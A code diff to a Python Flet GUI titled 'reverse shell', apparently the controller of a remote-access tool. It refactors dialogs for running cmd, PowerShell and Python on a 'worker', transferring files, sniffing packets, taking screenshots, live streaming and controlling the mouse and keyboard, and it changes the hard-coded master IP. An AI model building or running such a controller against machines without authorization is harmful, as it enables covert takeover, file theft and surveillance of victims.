@@ -20,27 +20,13 @@ def get_options(functions:dict[str,Commend],type:str) -> list[DropdownOption]:
         for function in ["press_key_in_worker","control_mouse"]:
             options_list.append(ft.DropdownOption(key=function))
     return options_list
-def cmd() -> str:
-    return "enter the cmd command you want to run in the worker"
-def powershell() -> str:
-    return "enter the powershell command you want to run in the worker"
-def python() -> str:
-    return "enter the python code you want to run in the worker. make sure the spacing is correct and you can enter multiple lines"
-def receive_file() -> str:
-    return "enter the path of the file you want in the worker side"
-def send_file() -> str:
-    return "enter the file path you want to send to worker, pick a name for the file in the worker side. separate the two with a \",\""
-def sniff_from_worker() -> str:
-    return "enter: your filter for the sniffing,the sniffing time, amount of packets. all separated by a \",\" REMEMBER when you are asked to enter the file name the file type is .pcap"
-
-
 
 class App:
     def __init__(self):
-        self.input_required_functions: dict[str,Callable[[],str]]= {"cmd" : cmd,"python":python,"powershell":powershell,"receive_file":receive_file,"send_file":send_file,"sniff_from_worker":sniff_from_worker}
+        self.input_required_functions: dict[str,Callable[[],ft.AlertDialog]]= {"cmd" : self.cmd,"python":self.python,"powershell":self.powershell,"receive_file":self.receive_file,"send_file":self.send_file,"sniff_from_worker":self.sniff_from_worker}
         self.page: ft.Page | None = None
-        self.master = Master("10.0.0.6",5555)
-        self.master.connect()
+        self.master = Master("192.168.68.108",5555)
+        #self.master.connect()
         self.title = ft.Container(
             content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
             alignment=ft.alignment.top_center,
@@ -55,15 +41,8 @@ class App:
             editable=True,
             leading_icon=ft.Icons.SEARCH,
             label= "command",
-            options= get_options(self.master.functions,"commends")
-        )
-        self.controls = ft.Dropdown(
-            border=ft.InputBorder.UNDERLINE,
-            enable_filter=True,
-            editable=True,
-            leading_icon=ft.Icons.SEARCH,
-            label="controls",
-            options= get_options(self.master.functions,"controls")
+            options= get_options(self.master.functions,"commends"),
+            on_change=self.choose_command
         )
         self.connected_worker=ft.DataTable(
             columns=[
@@ -85,19 +64,10 @@ class App:
             ]
 
         )
-        self.input_for_commends = ft.TextField(
-            label= "enter input for your specified commend",
-            disabled=True,
-            multiline = True,
-            min_lines = 1,
-            max_lines = 3,
-            border=ft.InputBorder.UNDERLINE,
-            filled=True,
-        )
-        self.input_help_dlg = ft.AlertDialog(title="how to input for your specific function:")
         self.exit = False
         self.livestream = ft.Checkbox(label="live stream", on_change=self.live_steam_pressed)
         self.master.on_stream_stop = self.live_stream_stopped
+        self.dlg:ft.AlertDialog | None= None
         threading.Thread(target=self.master.show_stream, daemon=True).start()
 
     def live_stream_stopped(self):
@@ -110,20 +80,44 @@ class App:
     def exit_button_pressed(self,e):
         self.exit = True
 
-    def reset(self):
-        self.input_for_commends.disabled = True
-        self.input_for_commends.value = None
-        self.commands.disabled = False
-        self.input_help_dlg.content = None
-        self.page.update()
-
     def add_output(self, message:str):
         self.output_box.rows.insert(0,ft.DataRow(
             [ft.DataCell(ft.Text(message,text_align=ft.TextAlign.CENTER))]
         ))
         self.page.update()
 
+    def cmd(self) -> ft.AlertDialog:
+        return ft.AlertDialog(title="enter the cmd command you want to run in the worker:",
+                              content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,on_submit=self.send_button_pressed))
 
+    def powershell(self) -> ft.AlertDialog:
+        return ft.AlertDialog(title="enter the powershell command you want to run in the worker",content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,on_submit=self.send_button_pressed))
+
+
+    def python(self) -> ft.AlertDialog:
+        text_field = ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,multiline = True,min_lines = 1,max_lines = 3,
+                                                   on_submit=self.send_button_pressed, shift_enter=True)
+        dlg = ft.AlertDialog(title="enter the python code you want to run in the worker. make sure the spacing is correct and you can enter multiple lines by pressing shift+enter",
+                              content=text_field)
+
+        return dlg
+
+    def receive_file(self) -> ft.AlertDialog:
+        return ft.AlertDialog(
+            title="enter the path of the file you want in the worker side",
+            content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,
+                                 on_submit=self.send_button_pressed))
+
+    def send_file(self) -> ft.AlertDialog:
+        return ft.AlertDialog(
+            title="enter the file path you want to send to worker, pick a name for the file in the worker side. separate the two with a \",\"",
+            content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,
+                                 on_submit=self.send_button_pressed))
+    def sniff_from_worker(self) -> ft.AlertDialog:
+        return ft.AlertDialog(
+            title="enter: your filter for the sniffing,the sniffing time, amount of packets. all separated by a \",\" REMEMBER when you are asked to enter the file name the file type is .pcap",
+            content=ft.TextField(border=ft.InputBorder.UNDERLINE, filled=True,
+                                 on_submit=self.send_button_pressed))
 
     def save_file(self,received: bytes) -> str:
         def check_name(e):
@@ -145,13 +139,13 @@ class App:
         return f"file saved as {file_name}"
 
     def send_button_pressed(self,e):
-        if self.input_for_commends is None:
+        if e.control.value is None:
             return
         function = self.commands.value
-        message = self.input_for_commends.value
+        message = e.control.value
         message = message.replace(" ","")
         message = message.replace(",",":")
-        if function == "send_file" and ":" not in message:
+        if function in ["send_file","sniff_from_worker"] and ":" not in message:
             self.page.open(ft.AlertDialog(content=ft.Text("you must enter a \",\" press the \"?\" for more instructions")))
             return
         received = self.master.run2(function,message.encode())
@@ -159,23 +153,21 @@ class App:
             self.add_output(received.decode())
             return
         if function in ["receive_file","sniff_from_worker"]:
+            self.page.close(self.dlg)
             self.save_file(received)
-            self.reset()
             return
         self.add_output(received.decode())
-        self.reset()
+
+        self.page.close(self.dlg)
 
     def choose_command(self,e):
         if self.commands.value is None:
             return
         function = self.commands.value
         if function in self.input_required_functions.keys():
-            self.input_for_commends.disabled = False
-            self.input_help_dlg.content = ft.Text(self.input_required_functions[function]())
-            self.commands.disabled = True
-            self.page.update()
+            self.dlg = self.input_required_functions[function]()
+            self.page.open(self.dlg)
         else:
-            self.reset()
             if function == "screen_shot":
                 self.save_file(self.master.run2(function,function.encode()))
             else:
@@ -202,8 +194,6 @@ class App:
                               #     padding=10,
                               #     border_radius=10,
                               # ),
-                              self.livestream,
-                              ft.VerticalDivider(width=6, thickness=3),
                               ft.Column(
                                   spacing=10,
                                   controls=[
@@ -218,23 +208,12 @@ class App:
                                               horizontal_lines=ft.BorderSide(color=self.page.bgcolor, width=0),
                                               columns=[
                                                    ft.DataColumn(self.commands),
-                                                   ft.DataColumn(ft.IconButton(ft.Icons.ADD_ROUNDED,
-                                                                               on_click=self.choose_command,
-                                                                               icon_color=ft.Colors.BLACK,
-                                                                               tooltip="start your function")),
-                                                   ft.DataColumn(ft.IconButton(ft.Icons.QUESTION_MARK_ROUNDED,
-                                                                               on_click=lambda e: page.open(
-                                                                                   self.input_help_dlg),
-                                                                               icon_color=ft.Colors.BLACK,
-                                                                               tooltip="how to add")),
+
 
                                                    ],
                                               rows=[
-                                                  ft.DataRow([ft.DataCell(self.input_for_commends), ft.DataCell(
-                                                      ft.IconButton(ft.Icons.ADD_ROUNDED,
-                                                                    on_click=self.send_button_pressed,
-                                                                    icon_color=ft.Colors.BLACK, tooltip="send input")),
-                                                              ft.DataCell(ft.Text())]),
+                                                  ft.DataRow([ft.DataCell(self.livestream),
+                                                              ]),
                                               ]
 
                                           )
